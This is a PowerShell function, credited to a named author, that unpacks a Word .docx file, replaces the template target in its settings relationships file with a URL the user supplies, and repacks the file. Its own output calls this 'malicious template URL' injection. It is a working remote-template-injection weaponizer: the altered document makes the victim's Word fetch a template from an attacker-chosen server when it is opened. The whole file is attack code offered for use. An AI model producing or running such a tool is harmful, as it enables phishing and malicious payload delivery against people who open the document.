function Template-Inject ([string]$Document,[string]$TemplateURL) {
# AUTHOR: Tyler McCann (@tylerdotrar)
# ARBITRARY VERSION NUMBER: 1.0.0
    
    # Error Correction
    if (!(Test-Path -LiteralPath $Document)) { return (Write-Host 'Target document does not exist.' -ForegroundColor Red) }
    if ($Document -notlike "*.docx")         { return (Write-Host 'Target document not in the correct format.' -ForegroundColor Red) }
    if (!$TemplateURL)                       { return (Write-Host 'Template URL not input.' -ForegroundColor Red) }
    if ($TemplateURL -notlike "http*")       { return (Write-Host 'Template URL not in correct format.' -ForegroundColor Red) }
    
    # Establish Variables
    $ZipArchive      = $Document.Replace('.docx','.zip')
    $InjectionFolder = $Document.Replace('.docx','')
    $SettingsFile    = "$InjectionFolder\word\_rels\settings.xml.rels"
    
    Write-Output "Injecting malicious template URL into $Document..."

    # Deconstruct the .docx
    Rename-Item -LiteralPath $Document -NewName $ZipArchive -Force
    Write-Output '- Converting to .zip'
    Start-Sleep -Milliseconds 1500
    Expand-Archive -LiteralPath $ZipArchive -DestinationPath $InjectionFolder
    Write-Output '- Expanding Archive'
    Start-Sleep -Milliseconds 1500
    Remove-Item -LiteralPath $ZipArchive -Recurse -Force
    Write-Output '- Cleaning Up'
    Start-Sleep -Milliseconds 1500

    # Adjust the internal URL
    $SettingsContent = Get-Content -LiteralPath $SettingsFile
    $OriginalTarget  = $SettingsContent.Split(" ")[-2]
    $TemplateTarget  = "Target=`"$TemplateURL`""
    $SettingsContent.Replace($OriginalTarget,$TemplateTarget) | Out-File -LiteralPath $SettingsFile -Encoding utf8
    Write-Output '- Injecting Template URL'
    Start-Sleep -Milliseconds 1500

    # Rebuild the .docx
    $FolderContents = (Get-ChildItem -LiteralPath $InjectionFolder).FullName
    Compress-Archive -LiteralPath $FolderContents -DestinationPath $ZipArchive -Force
    Write-Output '- Compressing Archive'
    Start-Sleep -Milliseconds 1500
    Rename-Item -LiteralPath $ZipArchive -NewName $Document -Force
    Write-Output '- Converting to .docx'
    Start-Sleep -Milliseconds 1500
    Remove-Item -LiteralPath $InjectionFolder -Recurse -Force
    Write-Output '- Cleaning Up'

    return "$Document successfully injected."
}